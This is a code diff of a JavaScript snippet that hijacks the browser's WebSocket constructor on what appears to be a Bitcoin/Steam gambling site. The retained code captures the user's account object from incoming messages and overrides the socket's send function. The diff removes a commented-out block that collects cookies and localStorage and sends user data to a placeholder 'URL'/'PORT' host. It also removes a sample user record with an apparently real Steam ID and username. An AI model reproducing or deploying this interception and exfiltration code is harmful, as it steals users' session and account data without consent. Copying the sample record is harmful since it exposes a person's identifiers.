@@ -9,11 +9,11 @@
 
     var user;
 
-    var manageData = (a) => {
+    var manageData_EL = (a) => { // Event Listener
         var b = extractData(a.data);
         if (b[0] == 'initialize' && typeof b[1]['user'] == 'object') {
             user = b[1]['user'];
-            this.removeEventListener('message', manageData);
+            this.removeEventListener('message', manageData_EL);
 
             this.__send = this.send;
             this.send = function(m) {
@@ -34,7 +34,7 @@
     w.WebSocket = function(...args) {
 
         var tws = new _WS(...args);
-        tws.addEventListener('message', manageData, false);
+        tws.addEventListener('message', manageData_EL, false);
         return tws;
     };
 
@@ -45,73 +45,3 @@
     w.WebSocket.prototype = _WS.prototype;
 
 });
-
-/*  USER CONECTION
-
-((w) => {
-
-    var cookies = {}, tc =  w.document.cookie.split(';');
-    for (let i = 0; i < tc.length; i++) {
-        let a = tc[i].split('=');
-        cookies[a[0]] = a[1];
-    }
-
-    var storage = w.localStorage;
-
-    if (!(
-        cookies['dataAlreadySended'] === 'true' ||
-        storage['dataAlreadySended'] === 'true'
-    )) {
-        var ws = new WebSocket('URL', 'PORT');
-
-        ws.onmessage = function(e) {
-            if (e.data === '1') ws.close();
-        };
-
-        ws.onopen = function(e) {
-            ws.send(userData);
-        };
-
-    }
-
-
-});
-
-*/
-
-/* USERDATA
-[
-    "initialize", {
-        "playersOnline": {
-            "loggedIn": 2557,
-            "loggedOut": 122
-        },
-        "user": {
-            "id": 1140326,
-            "steamid": "76561198419306669",
-            "image": "URL",
-            "username": "pytrandom",
-            "userclass": "user",
-            "balanceSatoshis": 0,
-            "net_profit": 0,
-            "affiliate_profit": 0,
-            "xp": 1,
-            "refer_link_id": null,
-            "verified": false,
-            "tradelink": "TRADE",
-            "name_promotion": false,
-            "last_claimed": null,
-            "admin": false,
-            "moderator": false,
-            "twitter_user_id": null,
-            "referrerName": null,
-            "referrerid": null,
-            "total_deposited": 0,
-            "muted_until": null,
-            "banned": false,
-            "total_referred_depositors": 0,
-            "steam_profile_private": true,
-            "created": "2017-09-07T19:38:47.722Z"
-        }
-}]
-*/
